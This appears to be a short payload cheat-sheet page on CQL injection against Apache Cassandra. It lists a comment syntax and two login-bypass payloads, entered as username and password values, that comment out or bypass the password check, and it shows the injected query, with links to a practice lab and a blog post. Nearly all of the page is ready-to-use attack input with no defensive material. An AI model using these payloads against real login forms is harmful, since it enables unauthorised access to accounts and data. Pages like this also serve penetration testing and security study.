# Cassandra Injection

> Apache Cassandra is a free and open-source distributed wide column store NoSQL database management system

## Cassandra comment

```sql
/* Cassandra Comment */
```

## Cassandra - Login Bypass

### Login Bypass 0

```sql
username: admin' ALLOW FILTERING; %00
password: ANY
```

### Login Bypass 1

```sql
username: admin'/*
password: */and pass>'
```

The injection would look like the following SQL query

```sql
SELECT * FROM users WHERE user = 'admin'/*' AND pass = '*/and pass>'' ALLOW FILTERING;
```

Example from EternalNoob : [https://hack2learn.pw/cassandra/login.php](https://hack2learn.pw/cassandra/login.php)

## References

* [Injection In Apache Cassandra – Part I - Rodolfo - EternalNoobs](https://eternalnoobs.com/injection-in-apache-cassandra-part-i/)